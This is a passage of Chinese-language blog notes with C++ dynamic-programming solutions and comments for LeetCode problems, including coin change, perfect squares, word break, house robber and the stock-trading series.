&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> amount, vector&lt;<span class="keyword">int</span>&gt;&amp; coins)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=coins[i];j&lt;=amount;j++)&#123;</span><br><span class="line">                dp[j] += dp[j-coins[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="377-组合总和-Ⅳ——排列数"><a href="#377-组合总和-Ⅳ——排列数" class="headerlink" title="377 组合总和 Ⅳ——排列数"></a>377 组合总和 Ⅳ——排列数</h3><p>给你一个由 不同 整数组成的数组 nums ，和一个目标整数 target 。请你从 nums 中找出并返回总和为 target 的元素组合的个数。<br>题目数据保证答案符合 32 位整数范围。<br><strong>请注意，顺序不同的序列被视作不同的组合。</strong><br>本题求的是排列总和，而且仅仅是求排列总和的个数，并不是把所有的排列都列出来。<br>如果本题要把排列都列出来的话，只能使用回溯算法爆搜。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    元素nums[i]-物品    背包容量j  target</span></span><br><span class="line"><span class="comment">    dp[i]  总和是j 的【组合个数】</span></span><br><span class="line"><span class="comment">    dp[0] = 1;</span></span><br><span class="line"><span class="comment">    dp[j] += dp[j-nums[i]] </span></span><br><span class="line"><span class="comment">    遍历顺序：该题是【排列】</span></span><br><span class="line"><span class="comment">        先背包，后物品</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">combinationSum4</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(target+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=target;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j-nums[i]&gt;=<span class="number">0</span> &amp;&amp; dp[j]&lt;INT_MAX-dp[j-nums[i]])</span><br><span class="line">                    dp[j] += dp[j-nums[i]]; </span><br><span class="line">                <span class="comment">//溢出条件判断：C++测试用例有两个数相加超过int的数据</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="279-完全平方数"><a href="#279-完全平方数" class="headerlink" title="279 完全平方数"></a>279 完全平方数</h3><p>给你一个整数 n ，返回 和为 n 的<strong>完全平方数的最少数量</strong> 。<br>完全平方数 是一个整数，其值等于另一个整数的平方；换句话说，其值等于一个整数自乘的积。例如，1、4、9 和 16 都是完全平方数，而 3 和 11 不是。</p>
<pre><code>输入：n = 13
输出：2
解释：13 = 4 + 9
</code></pre>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    物品：完全平方数1,4,9,16,...【无限使用】【完全背包】</span></span><br><span class="line"><span class="comment">    背包容量：n(题目给的)</span></span><br><span class="line"><span class="comment">    dp[i]：和为 n 的 完全平方数的【最少数量】</span></span><br><span class="line"><span class="comment">    要求最小数量，所以初始化INT_MAX</span></span><br><span class="line"><span class="comment">    dp[0]=0;</span></span><br><span class="line"><span class="comment">    dp[j] = min(dp[j],dp[j-i*i]+1)</span></span><br><span class="line"><span class="comment">    注意：任何一个正整数都可以使用完全平方数 凑成，因为再怎么样都使用1也能凑够。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>,INT_MAX)</span></span>;<span class="comment">//初始为 最大值，因为最后要求最小值</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=n;j++)&#123;<span class="comment">//背包</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i*i&lt;=j;i++)&#123;<span class="comment">//物品-完全平方数：从1开始</span></span><br><span class="line">                dp[j] = <span class="built_in">min</span>(dp[j],dp[j-i*i]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];<span class="comment">//一定会拼凑成</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 版本二</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, INT_MAX)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i * i &lt;= n; i++) &#123; <span class="comment">//物品</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i * i; j &lt;= n; j++) &#123; <span class="comment">//背包</span></span><br><span class="line">                dp[j] = <span class="built_in">min</span>(dp[j - i * i] + <span class="number">1</span>, dp[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="139-单词拆分"><a href="#139-单词拆分" class="headerlink" title="139 单词拆分"></a>139 单词拆分</h3><p>给你一个字符串 s 和一个字符串列表 wordDict 作为字典。请你判断是否可以利用字典中出现的单词拼接出 s 。<br>注意：不要求字典中出现的单词全部都使用，并且字典中的单词<strong>可以重复使用</strong>。</p>
<p>示例 1：</p>
<pre><code>输入: s = &quot;leetcode&quot;, wordDict = [&quot;leet&quot;, &quot;code&quot;]
输出: true
解释: 返回 true 因为 &quot;leetcode&quot; 可以由 &quot;leet&quot; 和 &quot;code&quot; 拼接成。
</code></pre>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    物品：单词字典中的单词wordDict[] 【多次】【完全背包】</span></span><br><span class="line"><span class="comment">    背包：字符串s</span></span><br><span class="line"><span class="comment">    【排列数】：因为顺序不同 组成的 最终字符串不同</span></span><br><span class="line"><span class="comment">    dp[j] 组成字符串长度是j[背包]的  结果：true or false</span></span><br><span class="line"><span class="comment">    先全部初始为 false</span></span><br><span class="line"><span class="comment">    dp[0]=true; </span></span><br><span class="line"><span class="comment">    if(dp[j-worDist[i]]==true &amp;&amp; j-i)</span></span><br><span class="line"><span class="comment">        dp[j] = true;</span></span><br><span class="line"><span class="comment">    substr(起始位置，截取的个数)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">wordBreak</span><span class="params">(string s, vector&lt;string&gt;&amp; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        unordered_set&lt;string&gt; seet;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;wordDict.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            seet.<span class="built_in">insert</span>(wordDict[i]);<span class="comment">//装入 set，便于 后序find</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">bool</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>,<span class="literal">false</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;<span class="comment">//背包 长度 1~n</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=j;i++)&#123;<span class="comment">//物品 长度 0~j</span></span><br><span class="line">                <span class="keyword">if</span>(dp[i]==<span class="literal">true</span> &amp;&amp; seet.<span class="built_in">find</span>(s.<span class="built_in">substr</span>(i,j-i))!=seet.<span class="built_in">end</span>())</span><br><span class="line">                    dp[j] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="198-打家劫舍"><a href="#198-打家劫舍" class="headerlink" title="198 打家劫舍"></a>198 打家劫舍</h3><p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，<strong>如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警</strong>。<br>给定一个代表每个房屋存放金额的[非负整数数组]，计算你 不触动警报装置的情况下 ，<strong>一夜之内能够偷窃到的最高金额</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    物品：nums[]每个房屋【现金】【一个房间一次】</span></span><br><span class="line"><span class="comment">    背包：</span></span><br><span class="line"><span class="comment">    求【最高金额】</span></span><br><span class="line"><span class="comment">    dp[j] 考虑下标j（包括j）以内的房屋，【最多可以偷窃的金额】</span></span><br><span class="line"><span class="comment">    限制条件：</span></span><br><span class="line"><span class="comment">        偷窃房屋不能相邻</span></span><br><span class="line"><span class="comment">    dp[j]=max(dp[j-2]+nums[i],dp[j-1])</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>,<span class="number">0</span>)</span></span>; </span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)<span class="comment">//由于下面 显式的写出了初始化dp[0]和dp[1]所以这里必须做出提前判断</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=nums[<span class="number">0</span>];   </span><br><span class="line">        dp[<span class="number">1</span>]=<span class="built_in">max</span>(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>;j&lt;n;j++)&#123;<span class="comment">//从2开始        </span></span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j<span class="number">-2</span>]+nums[j], dp[j<span class="number">-1</span>]);</span><br><span class="line">            <span class="comment">//偷当前房间：考虑j-2  不偷当前房间：考虑j-1</span></span><br><span class="line">            <span class="comment">//（注意：是考虑，并不是一定要偷i-1房，这是很多同学容易混淆的点）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="213-打家劫舍-II"><a href="#213-打家劫舍-II" class="headerlink" title="213 打家劫舍 II"></a>213 打家劫舍 II</h3><p><strong>所有的房屋都 围成一圈</strong> ，这意味着第一个房屋和最后一个房屋是紧挨着的。同时，<strong>相邻</strong>的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警 。<br>计算能够<strong>偷窃到的最高金额</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    分成两种情况：</span></span><br><span class="line"><span class="comment">        考虑首元素，不考虑尾元素</span></span><br><span class="line"><span class="comment">        考虑尾元素，不考虑首元素 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//不成环-线性打家劫舍</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pre_rob</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">        <span class="comment">//if(end-start==1)</span></span><br><span class="line">          <span class="comment">//  return max;</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(nums.size()+<span class="number">1</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[start] = nums[start];</span><br><span class="line">        dp[start+<span class="number">1</span>] = <span class="built_in">max</span>(nums[start],nums[start+<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=start+<span class="number">2</span>;i&lt;end;i++)&#123;</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>],dp[i<span class="number">-2</span>]+nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[end<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//成环-打家劫舍</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">2</span>) <span class="keyword">return</span> <span class="built_in">max</span>(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);<span class="comment">//新加的，不能同时偷这两个房间</span></span><br><span class="line">        <span class="comment">//考虑首元素，不考虑尾元素</span></span><br><span class="line">        <span class="keyword">int</span> res1 = <span class="built_in">pre_rob</span>(nums,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">        <span class="comment">//考虑尾元素，不考虑首元素</span></span><br><span class="line">        <span class="keyword">int</span> res2 = <span class="built_in">pre_rob</span>(nums,<span class="number">1</span>,n);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(res1,res2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="337-打家劫舍-III"><a href="#337-打家劫舍-III" class="headerlink" title="337 打家劫舍 III"></a>337 打家劫舍 III</h2><p>地区只有一个入口，称之为 root 。<br>除 root 之外，每栋房子有且只有一个“父“房子与之相连。一番侦察之后，聪明的小偷意识到“这个地方的所有<strong>房屋的排列类似于一棵二叉树</strong>”。 如果 两个直接相连的房子在同一天晚上被打劫 ，房屋将自动报警。<br>给定二叉树的 root 。返回 在不触动警报的情况下 ，小偷能够盗取的<strong>最高金额</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="121-买卖股票的最佳时机——买卖一次"><a href="#121-买卖股票的最佳时机——买卖一次" class="headerlink" title="121 买卖股票的最佳时机——买卖一次"></a>121 买卖股票的最佳时机——买卖一次</h3><p>给定一个数组 prices ，它的第 i 个元素 prices[i] 表示一支<strong>给定股票第 i 天的价格</strong>。<br>你只能选择 某一天 买入这只股票，并选择在 未来的某一个不同的日子 卖出该股票。设计一个算法来<strong>返回你所能获取的最大利润</strong>。<br>如果你不能获取任何利润，返回 0 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    股票 prices[i]</span></span><br><span class="line"><span class="comment">    dp[i][0] 【持有】当前股票】 能获取的最大利润</span></span><br><span class="line"><span class="comment">    dp[i][1] 【不持有】当前股票】 能获取的最大利润</span></span><br><span class="line"><span class="comment">    “持有”不代表就是当天“买入”！也有可能是昨天就买入了，今天保持持有的状态</span></span><br><span class="line"><span class="comment">    dp[i][0]=max(dp[i-1][0],-prices[i]) 买了</span></span><br><span class="line"><span class="comment">    【买卖一次：买股票肯定是第一次买，所以利润是-prices[i】</span></span><br><span class="line"><span class="comment">    dp[i][1]=max(dp[i-1][1],dp[i-1][0]+prices[i]) 卖了</span></span><br><span class="line"><span class="comment">    dp[0][0]=-prices[0]</span></span><br><span class="line"><span class="comment">    dp[0][1]=0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(<span class="number">2</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = -prices[<span class="number">0</span>];<span class="comment">//今天才持有，花出去prices[0]元</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span>;<span class="comment">//不持有，还是0元</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],-prices[i]);</span><br><span class="line">            dp[i][<span class="number">1</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-1</span>][<span class="number">0</span>]+prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    贪心</span></span><br><span class="line"><span class="comment">    取最左 最小值，取最右 最大值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*int n=prices.size(),ans=0;</span></span><br><span class="line"><span class="comment">        for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">            for(int j=i+1;j&lt;n;j++)</span></span><br><span class="line"><span class="comment">                ans = max(ans,prices[j]-prices[i]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return ans;*/</span></span><br><span class="line">        <span class="keyword">int</span> low=INT_MAX;</span><br><span class="line">        <span class="keyword">int</span> maxProfit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> price:prices)&#123;</span><br><span class="line">            low = <span class="built_in">min</span>(low,price);</span><br><span class="line">            maxProfit = <span class="built_in">max</span>(maxProfit,price-low);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxProfit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="122-买卖股票的最佳时机-II——买卖多次"><a href="#122-买卖股票的最佳时机-II——买卖多次" class="headerlink" title="122 买卖股票的最佳时机 II——买卖多次"></a>122 买卖股票的最佳时机 II——买卖多次</h3><p>在每一天，你可以决定是否购买和/或出售股票。你在任何时候 最多 只能持有 一股 股票。你也可以先购买，然后在 同一天 出售。</p>
<p>返回 你能获得的 最大 利润 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    dp[i][0]=max(dp[i-1][0],dp[i-1][1]-prices[i]) 买了</span></span><br><span class="line"><span class="comment">    【买卖多次：买股票不一定是第一次买，利润应该加上之前不持有的】</span></span><br><span class="line"><span class="comment">    dp[i][1]=max(dp[i-1][1],dp[i-1][0]+prices[i]) 卖了</span></span><br><span class="line"><span class="comment">    dp[0][0]=-prices[0]</span></span><br><span class="line"><span class="comment">    dp[0][1]=0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(<span class="number">2</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = -prices[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//从1开始</span></span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]-prices[i]);</span><br><span class="line">            dp[i][<span class="number">1</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-1</span>][<span class="number">0</span>]+prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="123-买卖股票的最佳时机-III——最多买卖两次"><a href="#123-买卖股票的最佳时机-III——最多买卖两次" class="headerlink" title="123 买卖股票的最佳时机 III——最多买卖两次"></a>123 买卖股票的最佳时机 III——最多买卖两次</h3><p>给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。<br>设计一个算法来计算你所能获取的最大利润。你<strong>最多可以完成 两笔 交易</strong>。<br>注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][0]不操作</span></span><br><span class="line"><span class="comment">    dp[i][1]第一次【持有】</span></span><br><span class="line"><span class="comment">    dp[i][2]第一次【不持有】</span></span><br><span class="line"><span class="comment">    dp[i][3]第二次【持有】</span></span><br><span class="line"><span class="comment">    dp[i][4]第二次【不持有】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(<span class="number">5</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;<span class="comment">//不操作</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = -prices[<span class="number">0</span>]; <span class="comment">//第一天持有</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">2</span>] = <span class="number">0</span>;          <span class="comment">//第一天不持有</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">3</span>] = -prices[<span class="number">0</span>];  <span class="comment">//第二天持有</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">4</span>] = <span class="number">0</span>;           <span class="comment">//第二天不持有</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">            dp[i][<span class="number">1</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-1</span>][<span class="number">0</span>]-prices[i]);</span><br><span class="line">            dp[i][<span class="number">2</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">2</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]+prices[i]);</span><br><span class="line">            dp[i][<span class="number">3</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">3</span>],dp[i<span class="number">-1</span>][<span class="number">2</span>]-prices[i]);</span><br><span class="line">            dp[i][<span class="number">4</span>] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">4</span>],dp[i<span class="number">-1</span>][<span class="number">3</span>]+prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][<span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="188-买卖股票的最佳时机-IV——最多k次买卖"><a href="#188-买卖股票的最佳时机-IV——最多k次买卖" class="headerlink" title="188 买卖股票的最佳时机 IV——最多k次买卖"></a>188 买卖股票的最佳时机 IV——最多k次买卖</h3><p>给你一个整数数组 prices 和一个整数 k ，其中 prices[i] 是某支给定的股票在第 i 天的价格。<br>设计一个算法来计算你所能获取的最大利润。你最多可以完成 k 笔交易。也就是说，你<strong>最多可以买 k 次，卖 k 次</strong>。<br>注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>
